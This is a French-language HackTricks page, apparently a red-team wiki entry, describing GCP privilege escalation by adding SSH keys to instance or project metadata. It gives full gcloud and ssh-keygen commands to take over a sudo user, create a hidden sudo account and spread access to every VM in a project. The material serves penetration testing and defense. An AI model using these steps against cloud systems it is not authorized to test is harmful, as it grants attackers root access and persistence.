# GCP - Ajouter des m√©tadonn√©es SSH personnalis√©es

## GCP - Ajouter des m√©tadonn√©es SSH personnalis√©es

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

### Modification des m√©tadonn√©es <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

La modification des m√©tadonn√©es sur une instance pourrait entra√Æner **des risques de s√©curit√© significatifs si un attaquant obtient les autorisations n√©cessaires**.

#### **Incorporation de cl√©s SSH dans les m√©tadonn√©es personnalis√©es**

Sur GCP, **les syst√®mes Linux** ex√©cutent souvent des scripts √† partir de l'[Environnement Invit√© Python Linux pour Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Un composant critique de cela est le [d√©mon des comptes](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), qui est con√ßu pour **v√©rifier r√©guli√®rement** le point de terminaison des m√©tadonn√©es de l'instance pour **des mises √† jour des cl√©s publiques SSH autoris√©es**.

Par cons√©quent, si un attaquant peut modifier les m√©tadonn√©es personnalis√©es, il pourrait faire en sorte que le d√©mon trouve une nouvelle cl√© publique, qui sera trait√©e et **int√©gr√©e dans le syst√®me local**. La cl√© sera ajout√©e au fichier `~/.ssh/authorized_keys` d'un **utilisateur existant ou potentiellement en cr√©ant un nouvel utilisateur avec des privil√®ges `sudo`**, selon le format de la cl√©. Et l'attaquant pourra compromettre l'h√¥te.

#### **Ajouter une cl√© SSH √† un utilisateur privil√©gi√© existant**

1. **Examiner les cl√©s SSH existantes sur l'instance :**
*   Ex√©cutez la commande pour d√©crire l'instance et ses m√©tadonn√©es afin de localiser les cl√©s SSH existantes. La section pertinente dans la sortie sera sous `metadata`, sp√©cifiquement la cl√© `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Faites attention au format des cl√©s SSH : le nom d'utilisateur pr√©c√®de la cl√©, s√©par√© par un deux-points.
2. **Pr√©parer un fichier texte pour les m√©tadonn√©es de la cl√© SSH :**
* Enregistrez les d√©tails des noms d'utilisateur et de leurs cl√©s SSH correspondantes dans un fichier texte nomm√© `meta.txt`. Cela est essentiel pour pr√©server les cl√©s existantes tout en ajoutant de nouvelles.
3. **G√©n√©rer une nouvelle cl√© SSH pour l'utilisateur cible (`alice` dans cet exemple) :**
*   Utilisez la commande `ssh-keygen` pour g√©n√©rer une nouvelle cl√© SSH, en veillant √† ce que le champ de commentaire (`-C`) corresponde au nom d'utilisateur cible.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Ajoutez la nouvelle cl√© publique √† `meta.txt`, en imitant le format trouv√© dans les m√©tadonn√©es de l'instance.
4. **Mettre √† jour les m√©tadonn√©es de la cl√© SSH de l'instance :**
*   Appliquez les m√©tadonn√©es de cl√© SSH mises √† jour √† l'instance en utilisant la commande `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Acc√©der √† l'instance en utilisant la nouvelle cl√© SSH :**
*   Connectez-vous √† l'instance avec SSH en utilisant la nouvelle cl√©, acc√©dant au shell dans le contexte de l'utilisateur cible (`alice` dans cet exemple).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Cr√©er un nouvel utilisateur privil√©gi√© et ajouter une cl√© SSH**

Si aucun utilisateur int√©ressant n'est trouv√©, il est possible d'en cr√©er un nouveau qui se verra attribuer des privil√®ges `sudo` :
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Cl√©s SSH au niveau du projet <a href="#sshing-around" id="sshing-around"></a>

Il est possible d'√©largir l'acc√®s SSH √† plusieurs machines virtuelles (VM) dans un environnement cloud en **appliquant des cl√©s SSH au niveau du projet**. Cette approche permet l'acc√®s SSH √† toute instance au sein du projet qui n'a pas explicitement bloqu√© les cl√©s SSH √† l'√©chelle du projet. Voici un guide r√©sum√© :

1. **Appliquer des cl√©s SSH au niveau du projet :**
*   Utilisez la commande `gcloud compute project-info add-metadata` pour ajouter des cl√©s SSH depuis `meta.txt` aux m√©tadonn√©es du projet. Cette action garantit que les cl√©s SSH sont reconnues sur toutes les VM du projet, sauf si une VM a l'option "Bloquer les cl√©s SSH √† l'√©chelle du projet" activ√©e.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH dans les instances en utilisant des cl√©s √† l'√©chelle du projet :**
* Avec des cl√©s SSH √† l'√©chelle du projet en place, vous pouvez SSH dans n'importe quelle instance au sein du projet. Les instances qui ne bloquent pas les cl√©s √† l'√©chelle du projet accepteront la cl√© SSH, accordant l'acc√®s.
* Une m√©thode directe pour SSH dans une instance est d'utiliser la commande `gcloud compute ssh [INSTANCE]`. Cette commande utilise votre nom d'utilisateur actuel et les cl√©s SSH d√©finies au niveau du projet pour tenter d'acc√©der.

## R√©f√©rences

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
